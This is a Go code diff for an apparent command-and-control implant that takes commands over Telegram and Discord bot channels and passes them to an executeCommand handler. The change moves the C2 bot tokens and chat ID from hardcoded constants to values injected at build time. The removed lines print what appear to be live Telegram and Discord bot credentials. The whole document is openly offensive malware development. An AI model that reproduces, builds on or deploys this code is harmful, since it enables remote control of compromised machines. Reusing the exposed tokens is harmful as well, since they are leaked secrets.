@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"os/signal"
 	"runtime"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -18,23 +19,35 @@ import (
 )
 
 // ─────────────────────────────────────────
-// Hardcoded C2 configuration
+// C2 configuration — injected at compile time via:
+//   go build -ldflags="-X main.telegramToken=XXX -X main.telegramChatID=YYY -X main.discordToken=ZZZ"
 // ─────────────────────────────────────────
-const (
-	telegramToken  = "8701233445:AAFFFMkoFV3UnDYGozcVSS0ONY8gQzwr1Vw"
-	telegramChatID = int64(-1003728125166)
-	discordToken   = "MTQ5MDI5MjcwOTcwODE0MDY0NQ.G-1l_H.g6uRMaNBy_bo5Xz0AufjsQqclwrawtIk-tTyV8"
+var (
+	telegramToken  = "PAYLOAD_NOT_CONFIGURED"
+	telegramChatID = "0"
+	discordToken   = "PAYLOAD_NOT_CONFIGURED"
 )
 
 func main() {
+	// Validate tokens were injected at compile time
+	if telegramToken == "PAYLOAD_NOT_CONFIGURED" || discordToken == "PAYLOAD_NOT_CONFIGURED" {
+		log.Fatal("Agent not configured — tokens were not injected at build time")
+	}
+
 	cfg := core.LoadConfig()
+
+	// Parse chat ID from string (injected via -ldflags)
+	chatID, err := strconv.ParseInt(telegramChatID, 10, 64)
+	if err != nil {
+		log.Fatalf("Invalid TELEGRAM_CHAT_ID: %v", err)
+	}
 
 	// Generate deterministic agent identity (hash of token + hostname)
 	agentID := core.AgentID(telegramToken)
 	log.Printf("Agent ID: %s", agentID)
 
 	// Build all available channels
-	channelMap := buildChannelMap(agentID)
+	channelMap := buildChannelMap(agentID, chatID)
 	if len(channelMap) == 0 {
 		log.Fatal("No channels available — cannot operate")
 	}
@@ -60,10 +73,10 @@ func main() {
 // Channel map builder
 // ─────────────────────────────────────────
 
-func buildChannelMap(agentID string) map[string]core.C2Channel {
+func buildChannelMap(agentID string, chatID int64) map[string]core.C2Channel {
 	channels := make(map[string]core.C2Channel)
 
-	channels["telegram"] = telegram.NewClient(telegramToken, telegramChatID, agentID, executeCommand)
+	channels["telegram"] = telegram.NewClient(telegramToken, chatID, agentID, executeCommand)
 	log.Printf("Telegram channel available")
 
 	channels["discord"] = discord.NewClient(discordToken, agentID, executeCommand)
